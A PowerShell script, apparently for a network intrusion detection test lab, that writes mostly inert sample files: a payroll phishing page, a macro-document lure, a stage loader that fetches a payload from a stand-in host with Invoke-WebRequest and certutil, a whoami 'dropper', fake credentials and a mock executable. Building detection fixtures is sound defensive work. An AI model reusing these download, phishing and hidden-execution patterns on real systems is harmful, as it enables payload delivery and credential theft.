[CmdletBinding()]
param(
    [string]$WorkspaceRoot = "C:\NIDS_Workspace",
    [string]$TargetDir = ""
)

$ErrorActionPreference = "Stop"

$workspaceRootResolved = [System.IO.Path]::GetFullPath($WorkspaceRoot)
$incomingRoot = Join-Path $workspaceRootResolved "NIDS_TestLab\artifacts\incoming"
$runToken = "seed-static-$(Get-Date -Format yyyyMMdd-HHmmss)"
$targetDirResolved = if ($TargetDir.Trim() -ne "") {
    [System.IO.Path]::GetFullPath($TargetDir)
} else {
    Join-Path $incomingRoot $runToken
}

New-Item -ItemType Directory -Force -Path $targetDirResolved | Out-Null

@'
<!DOCTYPE html>
<html>
<head>
  <title>Secure Payroll Verification</title>
  <script>var stepOne = "collect";</script>
  <script>var stepTwo = "validate";</script>
  <script>var stepThree = "redirect";</script>
  <script>var stepFour = "submit";</script>
</head>
<body>
  <h1>Payroll account check</h1>
  <p>Use the secure verification portal to confirm your payroll identity.</p>
  <a href="https://bit.ly/verify-payroll">Continue</a>
  <img src="https://corp-login.ngrok-free.app/assets/logo.png" />
</body>
</html>
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "01_phishing_portal.html") -Encoding ASCII

@'
Quarterly bonus review

Enable content to display the protected compensation summary.
If the preview is blank, reopen the document and enable editing.
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "02_bonus_review.docm") -Encoding ASCII

@'
$payloadUrl = "http://example.invalid/payload.bin"
powershell -NoProfile -WindowStyle Hidden
Invoke-WebRequest -Uri $payloadUrl -OutFile "$env:TEMP\payload.bin"
certutil -urlcache -split -f $payloadUrl "$env:TEMP\payload.bin"
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "03_stage_loader.ps1") -Encoding ASCII

@'
import os
import subprocess

cmd = "cmd.exe /c whoami"
subprocess.run(cmd, shell=True)
os.system("powershell -nop -c echo simulated")
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "04_ops_dropper.py") -Encoding ASCII

@'
{
  "user": "svc-sync",
  "password": "Summer2026!",
  "api_key": "ABCDEF0123456789",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
}
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "05_browser_tokens.json") -Encoding ASCII

@'
MZ
This is a safe inert fixture for static analysis only.
powershell
rundll32
http://example.invalid/update
ws2_32.dll
wininet.dll
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "06_photo_viewer_update.exe") -Encoding ASCII

@'
asset_id,owner,location
1001,helpdesk,New York
1002,finance,Boston
1003,engineering,Austin
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "08_benign_inventory.csv") -Encoding ASCII

$archiveSeedRoot = Join-Path $targetDirResolved "_archive_seed"
$bundleRoot = Join-Path $archiveSeedRoot "bundle"
$innerRoot = Join-Path $archiveSeedRoot "inner"
New-Item -ItemType Directory -Force -Path $bundleRoot | Out-Null
New-Item -ItemType Directory -Force -Path $innerRoot | Out-Null

@'
WScript.Echo("static fixture only");
'@ | Set-Content -LiteralPath (Join-Path $bundleRoot "invoice.js") -Encoding ASCII

@'
@echo off
echo static fixture only
'@ | Set-Content -LiteralPath (Join-Path $bundleRoot "run.cmd") -Encoding ASCII

@'
inner archive placeholder
'@ | Set-Content -LiteralPath (Join-Path $innerRoot "readme.txt") -Encoding ASCII

$innerZipPath = Join-Path $bundleRoot "payload.zip"
Compress-Archive -Path (Join-Path $innerRoot "*") -DestinationPath $innerZipPath -Force
$outerZipPath = Join-Path $targetDirResolved "07_invoice_bundle.zip"
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $outerZipPath -Force
Remove-Item -LiteralPath $archiveSeedRoot -Recurse -Force

Write-Output "Staged: $targetDirResolved"
